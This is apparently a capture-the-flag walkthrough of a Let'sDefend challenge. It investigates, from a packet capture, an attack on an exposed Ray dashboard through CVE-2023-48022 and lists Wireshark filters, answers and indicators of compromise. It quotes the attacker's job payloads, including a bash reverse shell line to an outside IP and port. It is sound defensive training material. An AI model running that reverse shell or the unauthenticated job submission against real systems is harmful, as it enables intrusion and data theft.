
# 🧠 Let’sDefend Walkthrough: Compromised AI Cluster Challenge

In this Let’sDefend challenge, you're investigating a suspected compromise of a cloud-hosted **AI infrastructure**. The organization uses **Ray**, an open-source distributed computing framework. Your evidence is a **PCAP file**, and your job is to figure out what happened, how, and who did it.

---

## 🔧 Tools Used

- **Wireshark** – packet analysis
- **HTTP protocol knowledge** – to analyze API interactions
- **Packet filters** – to isolate attacker traffic and extract IOCs

---

## 🔍 Step-by-Step Analysis

### 1. **What software framework was active on the server at the time of the incident?**
Observed repeated references to the **Ray** framework in HTTP requests.

✅ **Answer:** `Ray`

---

### 2. **What version of the software framework was installed?**
Filtered HTTP traffic for `"version"` in Wireshark and found the Ray version in a response body.

✅ **Answer:** `2.8.0`

---

### 3. **What is the public IP and port of the Ray dashboard?**
Located in the `Host:` header of HTTP requests.

✅ **Answer:** `3.72.0.226:8265`

---

### 4. **Which IP address was persistently accessing the Ray dashboard API?**
Filtered HTTP traffic and found IP `104.28.245.2` repeatedly accessing `/api/jobs`, `/api/packages`, etc.

✅ **Answer:** `104.28.245.2`

---

### 5. **When did the attacker first interact with the victim system?**
Found via ICMP echo requests in Wireshark.

✅ **Answer:** `2024-04-12 15:51:41 UTC`

---

### 6. **What is the first job submission ID by the attacker?**
Filtered:
```wireshark
http.request.method == "POST" && http contains "/api/jobs"
```
and extracted the first submission ID.

✅ **Answer:** `raysubmit_kkeJ8vLuM942ycqH`

---

### 7. **What vulnerability was used to compromise the system?**
Attacker used unauthenticated job submission via Ray’s API — matching:

✅ **Answer:** `CVE-2023-48022`

---

### 8. **What was the first command executed by the attacker?**
Found in job payload:
```python
import os; os.system('whoami')
```

✅ **Answer:** `whoami`

---

### 9. **What was the destination of the reverse shell?**
Payload showed:
```bash
bash -i >& /dev/tcp/52.150.25.174/1337 0>&1
```

✅ **Answer:** `52.150.25.174:1337`

---

### 10. **From which directory was the reverse shell launched?**
Found in job context:
```
/tmp/ray/session_2024-04-12_11-13-55_403523_10331/runtime_resources/working_dir_files/_ray_pkg_bf19252c1fb036e5
```

✅ **Answer:**
`/tmp/ray/session_2024-04-12_11-13-55_403523_10331/runtime_resources/working_dir_files/_ray_pkg_bf19252c1fb036e5`

---

### 11. **What job ID was used to exfiltrate the secrets file?**
Found another POST with:
```json
"submission_id": "raysubmit_7WZE36LAkVxbNc1x"
```

✅ **Answer:** `raysubmit_7WZE36LAkVxbNc1x`

---

### 12. **What new IP was used during exfiltration?**
Reverse shell and exfil traffic went to:

✅ **Answer:** `104.28.213.2`

---

### 13. **What did the file contain?**
Payload uploaded `secret.txt` with the content:

✅ **Answer:** `"Ops, you got me."`

---

### 14. **How many brute-force packets were sent?**
Used filter:
```wireshark
ip.src == 104.28.154.194 && tcp.flags.syn == 1 && tcp.flags.ack == 0 && ip.dst == 172.31.30.230
```
Then checked:
```
Statistics > Endpoints > IPv4
```

✅ **Answer:** `39,598 SYN packets`

---

## 📚 Lessons Learned

- Don’t expose Ray dashboard publicly without authentication.
- Monitor job submissions for suspicious code execution.
- Block known reverse shell patterns and unusual outbound traffic.
- Patch known vulnerabilities like **CVE-2023-48022**.

---

## 🛡 Indicators of Compromise (IOCs)

| Type             | Value                         |
|------------------|-------------------------------|
| Attacker IPs     | 104.28.245.2, 104.28.213.2, 104.28.154.194 |
| Exploit CVE      | CVE-2023-48022                |
| Reverse Shell IP | 52.150.25.174:1337            |
| Commands Used    | `whoami`, bash reverse shell  |
| File Stolen      | `secret.txt` with `"Ops, you got me."` |

---

If this walkthrough helped you, consider sharing or starring the repo! 🚀  
Got questions or corrections? PRs are welcome.
